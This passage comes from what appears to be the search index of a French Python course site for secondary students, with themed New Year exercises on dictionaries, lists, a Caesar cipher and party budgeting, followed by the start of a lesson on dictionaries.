\"Saumon fum\u00e9\", \"prix\": 12, \"restrictions\": []},\n        {\"nom\": \"Soupe \u00e0 l'oignon\", \"prix\": 6, \"restrictions\": []},\n        {\"nom\": \"Terrine de l\u00e9gumes\", \"prix\": 7, \"restrictions\": []}\n    ],\n    \"plats\": [\n        {\"nom\": \"Dinde aux marrons\", \"prix\": 20, \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n        {\"nom\": \"Saumon en cro\u00fbte\", \"prix\": 18, \"restrictions\": []},\n        {\"nom\": \"R\u00f4ti de b\u0153uf\", \"prix\": 22, \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n        {\"nom\": \"Lasagnes v\u00e9g\u00e9tariennes\", \"prix\": 15, \"restrictions\": []},\n        {\"nom\": \"Gratin dauphinois\", \"prix\": 12, \"restrictions\": []}\n    ],\n    \"desserts\": [\n        {\"nom\": \"B\u00fbche au chocolat\", \"prix\": 16, \"restrictions\": []},\n        {\"nom\": \"Crumble aux pommes\", \"prix\": 10, \"restrictions\": []},\n        {\"nom\": \"Plateau de fromages\", \"prix\": 14, \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n        {\"nom\": \"Salade de fruits\", \"prix\": 8, \"restrictions\": []},\n        {\"nom\": \"Tarte aux poires\", \"prix\": 11, \"restrictions\": []}\n    ]\n}\n\ninvites = [\n    {\"nom\": \"Marie\", \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n    {\"nom\": \"Paul\", \"restrictions\": []},\n    {\"nom\": \"Sophie\", \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n    {\"nom\": \"Lucas\", \"restrictions\": []},\n    {\"nom\": \"Emma\", \"restrictions\": []}\n]\n</code></pre></p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_7/#exercice-principal","title":"Exercice Principal","text":"<p>Plats accessibles</p> <p>\u00c9crire une fonction <code>plats_possibles</code> qui prend en param\u00e8tre le catalogue du traiteur et une restriction alimentaire, et renvoie un dictionnaire contenant les plats accessibles pour chaque type de plat (entr\u00e9es, plats, desserts).</p> <pre><code>&gt;&gt;&gt; plats = plats_possibles(catalogue_traiteur, \"v\u00e9g\u00e9tarien\")\n&gt;&gt;&gt; print(plats[\"entrees\"])  # affiche les entr\u00e9es possibles pour un v\u00e9g\u00e9tarien\n[\"Salade de quinoa\", \"Soupe \u00e0 l'oignon\", \"Terrine de l\u00e9gumes\"]\n</code></pre> <p>Composition d'un menu</p> <p>\u00c9crire une fonction <code>composer_menu</code> qui prend en param\u00e8tre le catalogue du traiteur et renvoie un dictionnaire avec un menu complet (une entr\u00e9e, un plat, un dessert) choisis al\u00e9atoirement.</p> <p>Indication : La fonction random.choice(sequence) du module random permet de faire des choix al\u00e9atoires dans des s\u00e9quences. Attention \u00e0 ne pas oublier d'importer le module random.**</p> <pre><code>#Exemple de random\n&gt;&gt;&gt;import random\n&gt;&gt;&gt;mylist = [\"apple\", \"banana\", \"cherry\"]\n&gt;&gt;&gt;print(random.choice(mylist))\nbanana\n</code></pre> <pre><code>&gt;&gt;&gt; menu = composer_menu(catalogue_traiteur)\n&gt;&gt;&gt; print(menu)\n{\n    'entree': 'Saumon fum\u00e9',\n    'plat': 'Dinde aux marrons',\n    'dessert': 'B\u00fbche au chocolat'\n}\n</code></pre> <p>V\u00e9rification du menu</p> <p>\u00c9crire une fonction <code>verifier_menu</code> qui prend en param\u00e8tre un menu et une liste d'invit\u00e9s, et renvoie la liste des invit\u00e9s qui ne peuvent pas manger ce menu \u00e0 cause de leurs restrictions.</p> <pre><code>&gt;&gt;&gt; menu = composer_menu(catalogue_traiteur)\n&gt;&gt;&gt; invites_probleme = verifier_menu(menu, invites)\n&gt;&gt;&gt; print(invites_probleme)  # affiche les invit\u00e9s ayant des restrictions incompatibles\n['Marie', 'Sophie']  # si le menu contient des plats non v\u00e9g\u00e9tariens\n</code></pre> <p>Menu pour tous</p> <p>\u00c9crire une fonction <code>menu_pour_tous</code> qui compose un menu que tous les invit\u00e9s peuvent manger et affiche le co\u00fbt total du menu.</p> <p>Cette fonction devra utiliser les fonctions pr\u00e9c\u00e9dentes pour : - Composer un menu al\u00e9atoire - V\u00e9rifier qu'il convient \u00e0 tous les invit\u00e9s - Recommencer si ce n'est pas le cas - Calculer et afficher le co\u00fbt total</p> <pre><code>&gt;&gt;&gt; menu_final = menu_pour_tous(catalogue_traiteur, invites)\nMenu s\u00e9lectionn\u00e9 :\n- Entr\u00e9e : Salade de quinoa (8\u20ac)\n- Plat : Lasagnes v\u00e9g\u00e9tariennes (15\u20ac)\n- Dessert : B\u00fbche au chocolat (16\u20ac)\nCo\u00fbt total : 39\u20ac\n</code></pre> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi qu'un exemple de menu g\u00e9n\u00e9r\u00e9 qui convient \u00e0 tous les invit\u00e9s.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_8/","title":"Jour 8 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : La playlist de la soir\u00e9e","text":"<p>Les invit\u00e9s veulent cr\u00e9er une playlist collaborative pour la soir\u00e9e. Chaque personne propose quelques chansons avec leur dur\u00e9e. Il faut analyser la playlist pour s'assurer qu'elle ne soit pas trop longue.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_8/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une chanson est repr\u00e9sent\u00e9e par un tuple : (titre, artiste, dur\u00e9e_en_secondes, propos\u00e9_par) - La playlist est une liste de chansons</p> <pre><code>playlist = [\n    (\"I Want It That Way\", \"Backstreet Boys\", 213, \"Alice\"),\n    (\"Shape of You\", \"Ed Sheeran\", 233, \"Paul\"),\n    (\"Blinding Lights\", \"The Weeknd\", 200, \"Sophie\"),\n    (\"Rolling in the Deep\", \"Adele\", 228, \"Lucas\"),\n    (\"Uptown Funk\", \"Mark Ronson feat. Bruno Mars\", 269, \"Alice\"),\n    (\"Levitating\", \"Dua Lipa\", 203, \"Sophie\"),\n    (\"Someone Like You\", \"Adele\", 285, \"Lucas\")]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_8/#exercice-principal","title":"Exercice Principal","text":"<p>Temps par personne</p> <p>\u00c9crire une fonction <code>temps_par_personne</code> qui prend en param\u00e8tre une playlist et renvoie un dictionnaire avec le temps total de musique propos\u00e9 par chaque personne.</p> <p>Un temps doit \u00eatre affich\u00e9 sous la forme \"X minutes et Y secondes\"</p> <pre><code>&gt;&gt;&gt; temps = temps_par_personne(playlist)\n&gt;&gt;&gt; print(temps[\"Marie\"])\n\"4 minutes et 1 secondes\"\n</code></pre> <p>Dur\u00e9e totale</p> <p>\u00c9crire une fonction <code>duree_totale</code> qui calcule la dur\u00e9e totale de la playlist.</p> <p>La dur\u00e9e doit \u00eatre affich\u00e9e sous la forme \"X heures et Y minutes\"</p> <pre><code>&gt;&gt;&gt; duree = duree_totale(playlist)\n&gt;&gt;&gt; print(duree)\n\"2 heures et 15 minutes\"\n</code></pre> <p>V\u00e9rification dur\u00e9e</p> <p>\u00c9crire une fonction <code>verifier_duree</code> qui prend en param\u00e8tre une playlist et une dur\u00e9e maximale en minutes, et qui renvoie True si la playlist ne d\u00e9passe pas la dur\u00e9e maximale.</p> <pre><code>&gt;&gt;&gt; verifier_duree(playlist, 180)  # 3 heures\nTrue\n</code></pre> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec la playlist fournie.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_9/","title":"Jour 9 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Le karaok\u00e9 du Nouvel An","text":"<p>Pour animer la soir\u00e9e, Jean veut organiser un karaok\u00e9. Il a une liste de chansons avec leurs paroles, mais il veut s'assurer que les chansons ne sont ni trop courtes ni trop longues.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_9/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une chanson est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - titre (str)   - artiste (str)   - paroles (list de str)   - difficulte (int de 1 \u00e0 5)</p> <pre><code>    chansons_karaoke = [\n    {\n        \"titre\": \"Diggy Diggy Hole\",\n        \"artiste\": \"Wind Rose\",\n        \"paroles\": [\n            \"I am a dwarf and I'm digging a hole\",\n            \"Diggy diggy hole, diggy diggy hole\",\n            \"I am a dwarf and I'm digging a hole\",\n            \"Diggy diggy hole, digging a hole\"\n        ],\n        \"difficulte\": 3\n    },\n    {\n        \"titre\": \"I Want It That Way\",\n        \"artiste\": \"Backstreet Boys\",\n        \"paroles\": [\n            \"You are my fire, the one desire\",\n            \"Believe when I say, I want it that way\",\n            \"But we are two worlds apart\",\n            \"Can't reach to your heart\",\n            \"When you say, that I want it that way\"\n        ],\n        \"difficulte\": 2\n    },\n    {\n        \"titre\": \"All Star\",\n        \"artiste\": \"Smash Mouth\",\n        \"paroles\": [\n            \"Somebody once told me the world is gonna roll me\",\n            \"I ain't the sharpest tool in the shed\",\n            \"She was looking kind of dumb with her finger and her thumb,\"\n            \"In the shape of an L on her forehead\"\n        ],\n        \"difficult\u00e9\" : 2\n    }\n    ]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_9/#exercice-principal","title":"Exercice Principal","text":"<p>Nombre de mots</p> <p>\u00c9crire une fonction <code>compter_mots</code> qui prend en param\u00e8tre une chanson et renvoie le nombre total de mots dans les paroles.</p> <p>Indication : Vous pouvez utiliser la m\u00e9thode <code>split()</code> pour s\u00e9parer une cha\u00eene en mots</p> <p>Filtrer par difficult\u00e9</p> <p>\u00c9crire une fonction <code>filtrer_difficulte</code> qui prend en param\u00e8tre une liste de chansons et un niveau de difficult\u00e9 maximum (1-5) et renvoie la liste des chansons ne d\u00e9passant pas ce niveau.</p> <p>Dur\u00e9e estim\u00e9e</p> <p>\u00c9crire une fonction <code>estimer_duree</code> qui estime la dur\u00e9e d'une chanson en secondes bas\u00e9e sur le nombre de mots.</p> <p>On consid\u00e8re qu'en moyenne on chante 2 mots par seconde</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec les chansons fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_10/","title":"Jour 10 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Le Quizz du Nouvel An","text":"<p>Jean veut organiser un quiz durant la soir\u00e9e avec des questions simples sur l'ann\u00e9e \u00e9coul\u00e9e.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_10/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une question est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - type (str) : \"qcm\" ou \"vf\"   - categorie (str)   - question (str)   - options (list) pour les QCM   - reponse (str ou bool selon le type)</p> <pre><code>questions = [\n    {\n        \"type\": \"qcm\",\n        \"categorie\": \"culture\",\n        \"question\": \"Quel film a gagn\u00e9 l'Oscar 2023 ?\",\n        \"options\": [\"Oppenheimer\", \"Barbie\", \"Avatar 2\"],\n        \"reponse\": \"Oppenheimer\"\n    },\n    {\n        \"type\": \"vf\",\n        \"categorie\": \"cinema\",\n        \"question\": \"Avatar 2 est sorti en 2023\",\n        \"reponse\": False\n    }\n]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_10/#exercice-principal","title":"Exercice Principal","text":"<p>Filtrer par cat\u00e9gorie</p> <p>\u00c9crire une fonction <code>questions_par_categorie</code> qui prend en param\u00e8tre la liste des questions et une cat\u00e9gorie, et renvoie toutes les questions de cette cat\u00e9gorie.</p> <p>M\u00e9langer les questions</p> <p>\u00c9crire une fonction <code>melanger_questions</code> qui prend en param\u00e8tre la liste des questions et renvoie une nouvelle liste avec les questions dans un ordre al\u00e9atoire.</p> <p>Indication : Utilisez la fonction random.shuffle()</p> <p>V\u00e9rifier r\u00e9ponse</p> <p>\u00c9crire une fonction <code>verifier_reponse</code> qui prend en param\u00e8tre une question et une r\u00e9ponse donn\u00e9e, et renvoie True si la r\u00e9ponse est correcte.</p> <p>Pour aller plus loin : Quiz</p> <p>\u00c9crire une fonction <code>quiz</code> qui prend en param\u00e8tre la liste des questions et permet de jouer au jeu : on demandera \u00e0 l'utilisateur la question, on associera chaque r\u00e9ponse \u00e0 un chiffre (1 \u00e0 4) et affichera dans le terminal <code>Bonne r\u00e9ponse</code> si la r\u00e9ponse est bonne, <code>Mauvaise r\u00e9ponse, c'\u00e9tait [r\u00e9ponse]</code> si elle est fausse et \u00e0 la fin de toutes les questions pos\u00e9es, le nombre de bonnes r\u00e9ponses donn\u00e9es.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions (ou 4 avec la plus compliqu\u00e9e) ainsi qu'un exemple d'utilisation avec les questions fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_11/","title":"Jour 11 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Les photos du r\u00e9veillon","text":"<p>Jean veut organiser les photos prises pendant la soir\u00e9e. Chaque photo est repr\u00e9sent\u00e9e par un dictionnaire contenant son nom, sa date, les personnes pr\u00e9sentes et sa taille.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_11/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une photo est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - nom (str)   - date (str)   - personnes (list de str)   - taille (float) en Mo</p> <pre><code>photos = [\n    {\n        \"nom\": \"IMG_001.jpg\",\n        \"date\": \"2024-01-01 00:01\",\n        \"personnes\": [\"Marie\", \"Paul\", \"Sophie\"],\n        \"taille\": 2.5\n    },\n    {\n        \"nom\": \"IMG_002.jpg\",\n        \"date\": \"2024-01-01 00:05\",\n        \"personnes\": [\"Lucas\", \"Emma\"],\n        \"taille\": 1.8\n    },\n    {\n        \"nom\": \"IMG_003.jpg\",\n        \"date\": \"2024-01-01 00:15\",\n        \"personnes\": [\"Jean\", \"Marie\"],\n        \"taille\": 3.2\n    },\n    {\n        \"nom\": \"IMG_004.jpg\",\n        \"date\": \"2024-01-01 00:20\",\n        \"personnes\": [\"Paul\", \"Lucas\", \"Sophie\"],\n        \"taille\": 2.7\n    },\n    {\n        \"nom\": \"IMG_005.jpg\",\n        \"date\": \"2024-01-01 00:25\",\n        \"personnes\": [\"Jean\", \"Emma\", \"Sophie\"],\n        \"taille\": 4.0\n    },\n    {\n        \"nom\": \"IMG_006.jpg\",\n        \"date\": \"2024-01-01 00:30\",\n        \"personnes\": [\"Marie\", \"Lucas\"],\n        \"taille\": 1.6\n    }\n]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_11/#exercice-principal","title":"Exercice Principal","text":"<p>Photos par personne</p> <p>\u00c9crire une fonction <code>photos_par_personne</code> qui prend en param\u00e8tre la liste des photos et renvoie un dictionnaire indiquant combien de fois chaque personne appara\u00eet sur les photos.</p> <p>Espace total</p> <p>\u00c9crire une fonction <code>espace_total</code> qui calcule l'espace total occup\u00e9 par les photos en Mo.</p> <p>Le r\u00e9sultat doit \u00eatre arrondi \u00e0 2 d\u00e9cimales</p> <p>Trouver photo</p> <p>\u00c9crire une fonction <code>trouver_photos</code> qui prend en param\u00e8tre la liste des photos et une liste de personnes, et renvoie toutes les photos o\u00f9 ces personnes apparaissent ensemble.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec les photos fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_12/","title":"Jour 12 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Le budget du r\u00e9veillon","text":"<p>Jean veut faire les comptes de la soir\u00e9e. Il a gard\u00e9 tous les tickets de caisse et veut r\u00e9partir les d\u00e9penses entre les participants.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_12/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une d\u00e9pense est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - categorie (str)   - montant (float)   - pay\u00e9_par (str)</p> <pre><code>depenses = [\n    {\"categorie\": \"nourriture\", \"montant\": 150.50, \"pay\u00e9_par\": \"Jean\"},\n    {\"categorie\": \"boissons\", \"montant\": 85.30, \"pay\u00e9_par\": \"Marie\"},\n    {\"categorie\": \"decoration\", \"montant\": 45.20, \"pay\u00e9_par\": \"Paul\"},\n    {\"categorie\": \"musique\", \"montant\": 30.00, \"pay\u00e9_par\": \"Lucas\"},\n    {\"categorie\": \"jeux\", \"montant\": 20.00, \"pay\u00e9_par\": \"Sophie\"},\n    {\"categorie\": \"transport\", \"montant\": 60.00, \"pay\u00e9_par\": \"Jean\"},\n    {\"categorie\": \"nourriture\", \"montant\": 50.00, \"pay\u00e9_par\": \"Marie\"},\n    {\"categorie\": \"boissons\", \"montant\": 40.00, \"pay\u00e9_par\": \"Sophie\"},\n    {\"categorie\": \"decoration\", \"montant\": 25.00, \"pay\u00e9_par\": \"Jean\"},\n    {\"categorie\": \"musique\", \"montant\": 10.00, \"pay\u00e9_par\": \"Paul\"}\n]\n\nparticipants = [\"Jean\", \"Marie\", \"Paul\", \"Sophie\", \"Lucas\"]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_12/#exercice-principal","title":"Exercice Principal","text":"<p>Total par cat\u00e9gorie</p> <p>\u00c9crire une fonction <code>total_par_categorie</code> qui calcule le total des d\u00e9penses par cat\u00e9gorie.</p> <p>Les montants doivent \u00eatre arrondis \u00e0 2 d\u00e9cimales</p> <p>Part par personne</p> <p>\u00c9crire une fonction <code>calculer_parts</code> qui calcule combien chaque personne doit payer (r\u00e9partition \u00e9quitable du total).</p> <p>Les montants doivent \u00eatre arrondis \u00e0 2 d\u00e9cimales</p> <p>Bilan des comptes</p> <p>\u00c9crire une fonction <code>bilan_comptes</code> qui indique pour chaque personne combien elle doit recevoir ou payer pour \u00e9quilibrer les comptes.</p> <p>Les montants doivent \u00eatre arrondis \u00e0 2 d\u00e9cimales Un montant positif indique que la personne doit recevoir de l'argent Un montant n\u00e9gatif indique que la personne doit payer</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec les d\u00e9penses fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_13/","title":"Jour 13 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Les r\u00e9solutions du Nouvel An","text":"<p>Jean propose \u00e0 ses invit\u00e9s d'\u00e9crire leurs bonnes r\u00e9solutions pour l'ann\u00e9e \u00e0 venir. Pour rendre le jeu plus amusant, chacun doit aussi estimer ses chances de r\u00e9ussite pour chaque r\u00e9solution.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_13/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une r\u00e9solution est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - texte (str)   - categorie (str) : \"sport\", \"travail\", \"personnel\", \"voyage\", \"autre\"   - chance_reussite (int) : un pourcentage entre 0 et 100   - delai (str) : \"1 mois\", \"3 mois\", \"6 mois\" ou \"1 an\"</p> <pre><code>resolutions = [\n    {\n        \"texte\": \"Faire du sport 3 fois par semaine\",\n        \"categorie\": \"sport\",\n        \"chance_reussite\": 75,\n        \"delai\": \"1 mois\",\n        \"personne\": \"Marie\"\n    },\n    {\n        \"texte\": \"Apprendre le piano\",\n        \"categorie\": \"personnel\",\n        \"chance_reussite\": 40,\n        \"delai\": \"1 an\",\n        \"personne\": \"Paul\"\n    },\n    {\n        \"texte\": \"Voyager au Japon\",\n        \"categorie\": \"voyage\",\n        \"chance_reussite\": 60,\n        \"delai\": \"6 mois\",\n        \"personne\": \"Sophie\"\n    }\n]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_13/#exercice-principal","title":"Exercice Principal","text":"<p>R\u00e9solutions optimistes</p> <p>\u00c9crire une fonction <code>resolutions_optimistes</code> qui prend en param\u00e8tre la liste des r\u00e9solutions et renvoie les r\u00e9solutions dont la chance de r\u00e9ussite est sup\u00e9rieure \u00e0 70%.</p> <pre><code>&gt;&gt;&gt; optimistes = resolutions_optimistes(resolutions)\n&gt;&gt;&gt; for r in optimistes:\n...     print(r['personne']+  \"est optimiste pour : \"+r['texte']+ \"(\"+r['chance_reussite']+\"%)\")\nMarie est optimiste pour : Faire du sport 3 fois par semaine (75%)\n</code></pre> <p>Statistiques par cat\u00e9gorie</p> <p>\u00c9crire une fonction <code>stats_categories</code> qui prend en param\u00e8tre la liste des r\u00e9solutions et renvoie pour chaque cat\u00e9gorie : - Le nombre de r\u00e9solutions - La moyenne des chances de r\u00e9ussite - Le d\u00e9lai le plus fr\u00e9quent</p> <p>La moyenne doit \u00eatre arrondie \u00e0 2 d\u00e9cimales</p> <pre><code>&gt;&gt;&gt; stats = stats_categories(resolutions)\n&gt;&gt;&gt; print(stats[\"sport\"])\n{'nombre': 1, 'moyenne_chances': 75.00, 'delai_frequent': '1 mois'}\n</code></pre> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les deux fonctions ainsi qu'un exemple d'utilisation avec les r\u00e9solutions fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_14/","title":"Jour 14 \ud83d\udc3b\ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Messages secrets du R\u00e9veillon","text":"<p>Jean et ses invit\u00e9s d\u00e9cident de jouer \u00e0 un jeu de messages secrets pendant la soir\u00e9e. Ils ont d\u00e9couvert le chiffrement de C\u00e9sar, une m\u00e9thode historique qui consiste \u00e0 d\u00e9caler les lettres de l'alphabet. Ils veulent cr\u00e9er un petit syst\u00e8me pour s'envoyer des messages cod\u00e9s pendant la soir\u00e9e.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_14/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Un message est une cha\u00eene de caract\u00e8res - Un d\u00e9calage est un nombre entier - L'alphabet utilis\u00e9 est l'alphabet standard (26 lettres sans accents) - Les espaces ne sont pas modifi\u00e9s par le chiffrement - Les messages sont toujours en minuscules</p> <p>Pour vous aider \u00e0 r\u00e9aliser les d\u00e9calages, voici l'alphabet avec la position de chaque lettre : <pre><code>ALPHABET = \"abcdefghijklmnopqrstuvwxyz\"\n# Position :  0123456789...\n</code></pre></p> <p>Note importante sur le retour au d\u00e9but de l'alphabet : Quand on fait un d\u00e9calage qui d\u00e9passe la fin de l'alphabet (apr\u00e8s 'z'), on doit revenir au d\u00e9but (\u00e0 'a'). En Python, on peut utiliser l'op\u00e9rateur modulo <code>%</code> pour cela : - <code>nombre % 26</code> nous donne le reste de la division par 26 - Cela permet de \"revenir \u00e0 z\u00e9ro\" quand on d\u00e9passe 25</p> <p>Exemple : <pre><code># Si on d\u00e9cale 'y' de 3 positions :\n# Position de 'y' = 24\n# 24 + 3 = 27\n# 27 % 26 = 1 donc on revient \u00e0 la position 1 ('b')\n\n# Si on d\u00e9cale 'a' de 27 positions :\n# Position de 'a' = 0\n# 0 + 27 = 27\n# 27 % 26 = 1 donc lettre \u00e0 la position 1 ('b')\n</code></pre></p>"},{"location":"premiere/New_Year_Advent/Exercices_J10-J14/Jour_14/#exercice-principal","title":"Exercice Principal","text":"<p>Chiffrement de message</p> <p>\u00c9crire une fonction <code>chiffrer_message</code> qui prend en param\u00e8tre un message et un d\u00e9calage et renvoie le message chiffr\u00e9.</p> <p>Indication : On peut utiliser la cha\u00eene ALPHABET et la m\u00e9thode <code>index()</code> pour trouver la position d'une lettre</p> <pre><code>&gt;&gt;&gt; message = \"bonne annee\"\n&gt;&gt;&gt; chiffre = chiffrer_message(message, 3)\n&gt;&gt;&gt; print(chiffre)\n\"erqqh dqqhh\"\n</code></pre> <p>D\u00e9chiffrement de message</p> <p>\u00c9crire une fonction <code>dechiffrer_message</code> qui prend en param\u00e8tre un message chiffr\u00e9 et le d\u00e9calage utilis\u00e9, et renvoie le message d'origine.</p> <pre><code>&gt;&gt;&gt; message_chiffre = \"erqqh dqqhh\"\n&gt;&gt;&gt; original = dechiffrer_message(message_chiffre, 3)\n&gt;&gt;&gt; print(original)\n\"bonne annee\"\n</code></pre> <p>V\u00e9rification de message</p> <p>\u00c9crire une fonction <code>est_message_valide</code> qui v\u00e9rifie si un message peut \u00eatre correctement chiffr\u00e9 (uniquement des lettres minuscules non accentu\u00e9es et des espaces).</p> <pre><code>&gt;&gt;&gt; est_message_valide(\"bonne annee\")\nTrue\n&gt;&gt;&gt; est_message_valide(\"Bonne Ann\u00e9e !\")\nFalse\n</code></pre> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec des messages de voeux pour la nouvelle ann\u00e9e.</p>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Cours/Cours_1/","title":"Cours 1","text":"\ud83d\udcda Dictionnaires en Python <p>Structures de donn\u00e9es cl\u00e9-valeur</p> \ud83d\udcd6 D\u00e9finition - D\u00e9finitions \ud83d\udcd6 Le dictionnaire              Une des nombreuses structures de Python est le dictionnaire.             Le dictionnaire est une structure de donn\u00e9es qui n'est pas index\u00e9e mais organis\u00e9e suivant des \u00e9l\u00e9ments que l'on nomme attributs (ou descripteur).             Ces attributs correspondent \u00e0 des propri\u00e9t\u00e9s sur l'\u00e9l\u00e9ment que l'on souhaite mod\u00e9liser.          \ud83d\udca1 Exemple : On souhaite mod\u00e9liser un mod\u00e8le de voiture. Lors de la conception d'une voiture, on peut modifier des \u00e9l\u00e9ments pour en cr\u00e9er des d\u00e9clinaisons.          \ud83d\ude97 Propri\u00e9t\u00e9s d'un mod\u00e8le de voiture \ud83c\udfa8 Couleurs rouge, bleu, vert, noir, blanc, gris \u26a1 Motorisations (en ch) 100, 110, 120, 200 \ud83d\udede Taille de jantes 16, 17, 18, 19              Pour cr\u00e9er ce genre d'objets, on utilise donc la structure des dictionnaires.          \ud83d\udcd6 D\u00e9finition - Les dictionnaires en Python \ud83d\udd27 Syntaxe de cr\u00e9ation              Pour cr\u00e9er un dictionnaire, on utilise les accolades {} (\u00e0 la diff\u00e9rence des tableaux (parenth\u00e8ses (   )) ou des listes (crochets [   ])).             \u00c0 l'int\u00e9rieur de ces accolades, on utilise la syntaxe attribut : valeurs possibles.          \ud83d\udcdd Caract\u00e9ristiques des attributs <ul> <li>Un attribut correspond \u00e0 une propri\u00e9t\u00e9 d'un objet que l'on cherche \u00e0 mod\u00e9liser</li> <li>Il est repr\u00e9sent\u00e9 par une cha\u00eene de caract\u00e8res</li> <li>Les valeurs peuvent \u00eatre de types simples (entier, cha\u00eenes de caract\u00e8re, bool\u00e9en) ou complexes (listes, dictionnaires, tuples)</li> <li>Chaque couple attributs : valeurs est s\u00e9par\u00e9 par des virgules</li> </ul>              De base, un dictionnaire lorsqu'on le cr\u00e9e de cette mani\u00e8re, est d\u00e9pourvu d'attributs.             Pour cr\u00e9er un dictionnaire avec des attributs d\u00e9j\u00e0 connus, il existe deux m\u00e9thodes :          \ud83d\udccb M\u00e9thode 1 : \u00c9crire les propri\u00e9t\u00e9s \u00e0 l'instanciation \ud83d\udcbb Code Python <pre>\nmodele_voiture = {  \"couleurs\" : [\"rouge\", \"bleu\", \"vert\", \"noir\", \"blanc\", \"gris\"],\n                    \"motorisation_en_ch\" : [100,110,120,200],\n                    \"taille_jantes\" : [16,17,18,19]\n                 }\n                </pre> \ud83d\udccb M\u00e9thode 2 : Rajouter petit \u00e0 petit les propri\u00e9t\u00e9s \ud83d\udcbb Code Python <pre>\nmodele_voiture = {}\n\nmodele_voiture[\"couleurs\"] = [\"rouge\", \"bleu\", \"vert\", \"noir\", \"blanc\", \"gris\"]\nmodele_voiture[\"motorisation_en_ch\"] = [100,110,120,200]\nmodele_voiture[\"taille_jantes\"] = [16,17,18,19]\n                </pre> \ud83d\udd0d Acc\u00e8s et manipulation des dictionnaires \ud83d\udd11 Acc\u00e8s aux attributs              Pour acc\u00e9der \u00e0 un attribut du dictionnaire, on utilise la structure \u00e0 crochets comme pour les listes, mais au lieu d'indiquer un indice, on indique l'attribut s'il est d\u00e9j\u00e0 renseign\u00e9.          \ud83d\udcbb Usage principal des dictionnaires \ud83d\udd27 Op\u00e9rations courantes <pre>\n# Pour afficher le dictionnaire complet\nprint(modele_voiture)\n\n# Pour afficher les couleurs disponibles pour le mod\u00e8le\nprint(modele_voiture[\"couleurs\"])\n\n# Pour rajouter des couleurs \u00e0 celles existantes\nmodele_voiture[\"couleurs\"] = modele_voiture[\"couleurs\"] + [\"beige\"]\n\n# Pour retirer une clef et ses valeurs d'un dictionnaire\nmodele_voiture.pop(\"taille_jantes\")\n                </pre> \u26a0\ufe0f Ajout de valeurs              Pour rajouter des valeurs \u00e0 un attribut d'un dictionnaire, il faut bien faire attention aux types.             Par exemple, pour l'exemple pr\u00e9c\u00e9dent, nos valeurs \u00e9taient contenues dans des listes. Il faut donc op\u00e9rer par concat\u00e9nation de liste avec l'op\u00e9rateur + ou la m\u00e9thode .append(valeur).          \ud83d\udd04 Op\u00e9rations sur les dictionnaires \ud83d\udd01 It\u00e9rations sur un dictionnaire              Tout comme les listes et les tableaux, on peut it\u00e9rer sur les valeurs d'un dictionnaire. Cela permet de retrouver des 